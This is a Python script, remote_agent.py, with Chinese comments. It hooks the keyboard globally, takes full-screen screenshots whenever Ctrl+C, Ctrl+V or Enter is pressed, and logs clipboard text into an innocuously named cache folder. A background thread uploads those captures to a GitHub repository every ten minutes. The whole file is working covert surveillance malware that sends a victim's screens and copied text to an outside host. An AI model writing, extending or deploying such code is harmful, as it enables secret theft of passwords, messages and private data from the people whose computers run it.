# remote_agent.py (放置在 GitHub 仓库根目录或指定路径)
import base64
import os
import socket
import threading
import time
from PIL import Image, ImageGrab
from pynput import keyboard
import pyperclip
import requests

DEVICE_NAME = socket.gethostname()

SAVE_DIR = r"D:\AppDataLogs\Cache"
os.makedirs(SAVE_DIR, exist_ok=True)

# 优先从本地环境变量获取 Token，如果不存在则从本地 token.txt 文件读取
def get_local_token():
    env_token = os.environ.get("GITHUB_TOKEN")
    if env_token:
        return env_token.strip()
    
    token_file_path = os.path.join(SAVE_DIR, "token.txt")
    if os.path.exists(token_file_path):
        try:
            with open(token_file_path, "r", encoding="utf-8") as f:
                return f.read().strip()
        except Exception:
            pass
    return ""

GITHUB_CONFIG = {
    "username": "Bei18",
    "repo_name": "my-python-storage",
    "token": get_local_token(),
}

uploaded_files = set()


def upload_file_smart(file_path):
    if not os.path.exists(file_path):
        return False

    # 动态保证 Token 最新的状态
    token = GITHUB_CONFIG["token"] or get_local_token()
    if not token:
        return False

    file_name = os.path.basename(file_path)
    # 忽略本地保存 Token 的文件，防止误上传到远程仓库
    if file_name == "token.txt":
        return False

    target_path = f"uploads/{DEVICE_NAME}/{file_name}"

    base_url = f"https://api.github.com/repos/{GITHUB_CONFIG['username']}/{GITHUB_CONFIG['repo_name']}/contents/{target_path}"
    headers = {
        "Authorization": f"Bearer {token}",
        "Accept": "application/vnd.github+json",
    }

    try:
        get_res = requests.get(base_url, headers=headers, timeout=10)
        if get_res.status_code == 200:
            uploaded_files.add(file_name)
            return True

        with open(file_path, "rb") as f:
            file_content = f.read()
        encoded_content = base64.b64encode(file_content).decode("utf-8")

        data = {
            "message": f"Auto-sync upload: {file_name} from {DEVICE_NAME}",
            "content": encoded_content,
        }

        response = requests.put(base_url, headers=headers, json=data, timeout=15)
        if response.status_code in [200, 201]:
            uploaded_files.add(file_name)
            return True
        return False
    except Exception:
        return False


def scheduled_upload_task():
    while True:
        time.sleep(600)
        try:
            if not os.path.exists(SAVE_DIR):
                continue
            files = os.listdir(SAVE_DIR)
            for file in files:
                file_path = os.path.join(SAVE_DIR, file)
                if os.path.isfile(file_path) and file not in uploaded_files:
                    upload_file_smart(file_path)
        except Exception:
            pass


def get_log_file_path():
    today_date = time.strftime("%Y-%m-%d")
    log_filename = f"{DEVICE_NAME}-{today_date}-LOG.txt"
    return os.path.join(SAVE_DIR, log_filename)


def write_txt(action_type, detail=""):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    log_content = f"[{timestamp}] [{action_type}] {detail}\n"
    log_file = get_log_file_path()
    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(log_content)
            f.flush()
    except Exception:
        pass


def take_full_screenshot(action_type):
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    filename = f"{DEVICE_NAME}-{timestamp}-{action_type}.png"
    filepath = os.path.join(SAVE_DIR, filename)

    try:
        screenshot = ImageGrab.grab(all_screens=True)
        screenshot.save(filepath, "PNG")
        return filename
    except Exception:
        try:
            screenshot = ImageGrab.grab()
            screenshot.save(filepath, "PNG")
            return filename
        except Exception:
            return None


def get_clipboard_content():
    try:
        time.sleep(0.1)
        text = pyperclip.paste()
        if text and text.strip():
            clean_text = text.replace("\r\n", " ").replace("\n", " ")
            return f"文本: {clean_text}"
        else:
            return "无文本"
    except Exception:
        return "获取失败"


def on_copy():
    img_file = take_full_screenshot("COPY")
    clip_text = get_clipboard_content()
    write_txt("复制(Ctrl+C)", f"截图: {img_file} | {clip_text}")


def on_paste():
    img_file = take_full_screenshot("PASTE")
    clip_text = get_clipboard_content()
    write_txt("粘贴(Ctrl+V)", f"截图: {img_file} | {clip_text}")


def on_press(key):
    try:
        if key == keyboard.Key.enter:
            img_file = take_full_screenshot("ENTER")
            write_txt("回车(ENTER)", f"截图: {img_file}")
    except Exception:
        pass


def main():
    write_txt("启动", "代码加载成功，开始执行...")

    upload_thread = threading.Thread(target=scheduled_upload_task, daemon=True)
    upload_thread.start()

    hotkey_listener = keyboard.GlobalHotKeys(
        {"<ctrl>+c": on_copy, "<ctrl>+v": on_paste}
    )
    hotkey_listener.start()

    with keyboard.Listener(on_press=on_press) as key_listener:
        key_listener.join()

    hotkey_listener.stop()


if __name__ == "__main__":
    main()
